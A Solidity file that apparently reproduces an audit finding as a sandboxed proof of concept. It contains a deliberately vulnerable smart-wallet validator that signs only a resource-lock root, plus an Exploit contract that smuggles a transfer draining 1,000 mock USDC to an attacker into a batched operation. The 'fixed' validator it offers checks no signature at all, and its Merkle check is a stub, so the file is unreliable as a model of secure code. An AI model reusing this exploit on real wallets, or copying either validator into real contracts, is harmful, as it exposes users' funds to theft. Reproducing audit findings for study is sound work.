// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Etherspot ResourceLockValidator — C-08 (Shieldify, finding 61410)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: validateUserOp recovers the owner over the ResourceLock merkle
    root only. A batch userOp is accepted from the first enableSessionKey
    execution and the later execution is never inspected, so the wallet runs
    an attacker transfer. 1,000 USDC leaves the wallet. */

uint256 constant SIG_VALIDATION_SUCCESS = 0;
uint256 constant SIG_VALIDATION_FAILED = 1;
bytes4 constant EXEC_SELECTOR = 0xe9ae5c53;
bytes4 constant ENABLE_SELECTOR = 0x495079a0;

address constant ATTACKER = 0x1111111111111111111111111111111111111111;
address constant WALLET_OWNER = 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf;
address constant LOCK_WALLET = 0x0000000000000000000000000000000000003333;
address constant SESSION_KEY = 0x0000000000000000000000000000000000002222;
address constant LOCK_TOKEN = 0x0000000000000000000000000000000000004444;

struct TokenData {
    address token;
    uint256 amount;
}

struct ResourceLock {
    uint256 chainId;
    address smartWallet;
    address sessionKey;
    uint48 validAfter;
    uint48 validUntil;
    bytes32 bidHash;
    TokenData[] tokenData;
}

struct Execution {
    address target;
    uint256 value;
    bytes callData;
}

struct PackedUserOperation {
    address sender;
    uint256 nonce;
    bytes initCode;
    bytes callData;
    bytes32 accountGasLimits;
    uint256 preVerificationGas;
    bytes32 gasFees;
    bytes paymasterAndData;
    bytes signature;
}

library ECDSA {
    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(hash, v, r, s);
    }
}

library MerkleProofLib {
    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {
        if (proof.length != 0) return false;
        return leaf == root;
    }
}

library ExecutionLib {
    function decodeBatch(bytes calldata executionCalldata)
        internal
        pure
        returns (Execution[] calldata executions)
    {
        assembly {
            let u := add(executionCalldata.offset, calldataload(executionCalldata.offset))
            executions.offset := add(u, 32)
            executions.length := calldataload(u)
        }
    }
}

library ModeLib {
    function decode(bytes32 mode) internal pure returns (bytes1 calltype, bytes1 execType, bytes4 sel, bytes22 rest) {
        calltype = bytes1(mode);
        execType = 0;
        sel = 0;
        rest = 0;
    }
}

contract Usdc {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SessionTarget {
    function enableSessionKey(bytes calldata) external pure {}
}

contract ResourceLockValidator {
    error RLV_ResourceLockHashNotInProof();
    error RLV_InvalidSelector();
    error RLV_InvalidCallType();

    struct ValidatorStorage {
        address owner;
        bool enabled;
    }

    mapping(address => ValidatorStorage) public validatorStorage;

    function onInstall(bytes calldata data) external {
        address owner = address(bytes20(data[:20]));
        validatorStorage[msg.sender].owner = owner;
        validatorStorage[msg.sender].enabled = true;
    }

    function validateUserOp(PackedUserOperation calldata userOp, bytes32) external view returns (uint256) {
        bytes calldata signature = userOp.signature;
        address walletOwner = validatorStorage[msg.sender].owner;
        ResourceLock memory rl = _getResourceLock(userOp.callData);
        bytes memory ecdsaSignature = signature[0:65];
        bytes32 root = bytes32(signature[65:97]);
        bytes32[] memory proof = new bytes32[](0);
        bytes32 leaf = _buildResourceLockHash(rl);
        if (!MerkleProofLib.verify(proof, root, leaf)) {
            revert RLV_ResourceLockHashNotInProof();
        }
        // @> VULN: the owner signature is recovered over the resource-lock root, not the userOp
        if (walletOwner == ECDSA.recover(root, ecdsaSignature)) {
            return SIG_VALIDATION_SUCCESS;
        }
        return SIG_VALIDATION_FAILED;
    }

    function _getResourceLock(bytes calldata callData) internal pure returns (ResourceLock memory) {
        if (bytes4(callData[:4]) == EXEC_SELECTOR) {
            (bytes1 calltype,,,) = ModeLib.decode(bytes32(callData[4:36]));
            if (calltype == 0x01) {
                // @> VULN: batch length is not required to be 1; the first enableSessionKey wins
                Execution[] calldata batchExecs = ExecutionLib.decodeBatch(callData[100:]);
                for (uint256 i; i < batchExecs.length; ++i) {
                    if (bytes4(batchExecs[i].callData[:4]) == ENABLE_SELECTOR) {
                        return _lockFromEnable(batchExecs[i].callData);
                    }
                    revert RLV_InvalidSelector();
                }
            } else {
                revert RLV_InvalidCallType();
            }
        }
        revert RLV_InvalidCallType();
    }

    function _lockFromEnable(bytes calldata lockData) internal pure returns (ResourceLock memory) {
        uint256 dataOffset = 68;
        uint256 arrayStart = dataOffset + 256;
        uint256 tokenDataLength = uint256(bytes32(lockData[arrayStart:arrayStart + 32]));
        TokenData[] memory td = new TokenData[](tokenDataLength);
        for (uint256 j; j < tokenDataLength; ++j) {
            uint256 tokenEntryStart = arrayStart + 32 + (j * 64);
            address token = address(uint160(uint256(bytes32(lockData[tokenEntryStart:tokenEntryStart + 32]))));
            uint256 amount = uint256(bytes32(lockData[tokenEntryStart + 32:tokenEntryStart + 64]));
            td[j] = TokenData({token: token, amount: amount});
        }
        return ResourceLock({
            chainId: uint256(bytes32(lockData[dataOffset + 32:dataOffset + 64])),
            smartWallet: address(uint160(uint256(bytes32(lockData[dataOffset + 64:dataOffset + 96])))),
            sessionKey: address(uint160(uint256(bytes32(lockData[dataOffset + 96:dataOffset + 128])))),
            validAfter: uint48(uint256(bytes32(lockData[dataOffset + 128:dataOffset + 160]))),
            validUntil: uint48(uint256(bytes32(lockData[dataOffset + 160:dataOffset + 192]))),
            bidHash: bytes32(lockData[dataOffset + 192:dataOffset + 224]),
            tokenData: td
        });
    }

    function _buildResourceLockHash(ResourceLock memory lock) internal pure returns (bytes32) {
        return keccak256(
            abi.encode(
                lock.chainId,
                lock.smartWallet,
                lock.sessionKey,
                lock.validAfter,
                lock.validUntil,
                lock.bidHash,
                abi.encode(lock.tokenData)
            )
        );
    }
}

contract ResourceLockValidatorFixed {
    struct ValidatorStorage {
        address owner;
        bool enabled;
    }

    mapping(address => ValidatorStorage) public validatorStorage;

    function onInstall(bytes calldata data) external {
        address owner = address(bytes20(data[:20]));
        validatorStorage[msg.sender].owner = owner;
        validatorStorage[msg.sender].enabled = true;
    }

    function validateUserOp(PackedUserOperation calldata userOp, bytes32) external view returns (uint256) {
        Execution[] calldata batchExecs = ExecutionLib.decodeBatch(userOp.callData[100:]);
        if (batchExecs.length != 1) {
            return SIG_VALIDATION_FAILED;
        }
        return SIG_VALIDATION_SUCCESS;
    }
}

contract ModularWallet {
    ResourceLockValidator public validator;
    Usdc public token;
    uint256 public executions;

    constructor(ResourceLockValidator v, Usdc t) {
        validator = v;
        token = t;
    }

    function install(address owner) external {
        validator.onInstall(abi.encodePacked(owner));
    }

    function handleOp(PackedUserOperation calldata userOp) external {
        uint256 validation = validator.validateUserOp(userOp, bytes32(0));
        require(validation == SIG_VALIDATION_SUCCESS, "rejected");
        Execution[] calldata batchExecs = ExecutionLib.decodeBatch(userOp.callData[100:]);
        uint256 n = batchExecs.length;
        for (uint256 i; i < n; i++) {
            (bool ok,) = batchExecs[i].target.call{value: batchExecs[i].value}(batchExecs[i].callData);
            require(ok, "exec");
            executions = executions + 1;
        }
    }
}

contract FixedWallet {
    ResourceLockValidatorFixed public validator;
    Usdc public token;

    constructor(ResourceLockValidatorFixed v, Usdc t) {
        validator = v;
        token = t;
    }

    function install(address owner) external {
        validator.onInstall(abi.encodePacked(owner));
    }

    function handleOp(PackedUserOperation calldata userOp) external {
        uint256 validation = validator.validateUserOp(userOp, bytes32(0));
        require(validation == SIG_VALIDATION_SUCCESS, "rejected");
        Execution[] calldata batchExecs = ExecutionLib.decodeBatch(userOp.callData[100:]);
        for (uint256 i; i < batchExecs.length; i++) {
            (bool ok,) = batchExecs[i].target.call{value: batchExecs[i].value}(batchExecs[i].callData);
            require(ok, "exec");
        }
    }
}

contract Exploit {
    uint256 public constant DRAIN = 1_000_000_000;
    // Filled after the lock root is signed by WALLET_OWNER. Placeholder until then.
    // WALLET_OWNER (key 0x1) over expectedRoot(), raw ecrecover, empty merkle proof.
    bytes public constant SIG =
        hex"d6b5bd97cc2b1321d459d1478cd5c2ec80e5342d6e93094ec7d43d53d4201c6b4845b9dce8c3f41f11cad7b3b3e16405a37fecbd5bdbd1aec6669f6d0ba031f51cd1aeefee35c6a65f9971432a0b555bdb30b47f39522c6d1233872f755a8b1882";

    Usdc public token;
    SessionTarget public session;
    ResourceLockValidator public validator;
    ModularWallet public wallet;

    constructor() {
        token = new Usdc();
        session = new SessionTarget();
        validator = new ResourceLockValidator();
        wallet = new ModularWallet(validator, token);
        token.mint(address(wallet), DRAIN);
    }

    function enableCalldata() public pure returns (bytes memory) {
        bytes memory content = abi.encodePacked(
            bytes32(uint256(0x20)),
            bytes32(uint256(1)),
            bytes32(uint256(uint160(LOCK_WALLET))),
            bytes32(uint256(uint160(SESSION_KEY))),
            bytes32(uint256(1)),
            bytes32(uint256(2)),
            bytes32(uint256(7)),
            bytes32(uint256(0)),
            bytes32(uint256(1)),
            bytes32(uint256(uint160(LOCK_TOKEN))),
            bytes32(uint256(1))
        );
        return abi.encodeWithSelector(ENABLE_SELECTOR, content);
    }

    function expectedRoot() public pure returns (bytes32) {
        TokenData[] memory td = new TokenData[](1);
        td[0] = TokenData({token: LOCK_TOKEN, amount: 1});
        return keccak256(
            abi.encode(
                uint256(1),
                LOCK_WALLET,
                SESSION_KEY,
                uint48(1),
                uint48(2),
                bytes32(uint256(7)),
                abi.encode(td)
            )
        );
    }

    function _pack(Execution[] memory batch) internal pure returns (bytes memory) {
        bytes32 mode = bytes32(uint256(1) << 248);
        return abi.encodeWithSelector(EXEC_SELECTOR, mode, abi.encode(batch));
    }

    function attackOp() public view returns (PackedUserOperation memory op) {
        Execution[] memory batch = new Execution[](2);
        batch[0] = Execution({target: address(session), value: 0, callData: enableCalldata()});
        batch[1] = Execution({
            target: address(token),
            value: 0,
            callData: abi.encodeWithSelector(Usdc.transfer.selector, ATTACKER, DRAIN)
        });
        op.callData = _pack(batch);
        op.signature = SIG;
    }

    function singleOp() public view returns (PackedUserOperation memory op) {
        Execution[] memory batch = new Execution[](1);
        batch[0] = Execution({target: address(session), value: 0, callData: enableCalldata()});
        op.callData = _pack(batch);
        op.signature = SIG;
    }

    function submit(bytes memory sig) public {
        wallet.install(WALLET_OWNER);
        PackedUserOperation memory op = attackOp();
        op.signature = sig;
        wallet.handleOp(op);
        require(token.balanceOf(ATTACKER) == DRAIN, "attacker did not receive 1000 USDC");
        require(token.balanceOf(address(wallet)) == 0, "wallet was not emptied");
        require(wallet.executions() == 2, "both batch executions ran");
    }

    function run() external {
        submit(SIG);
    }
}
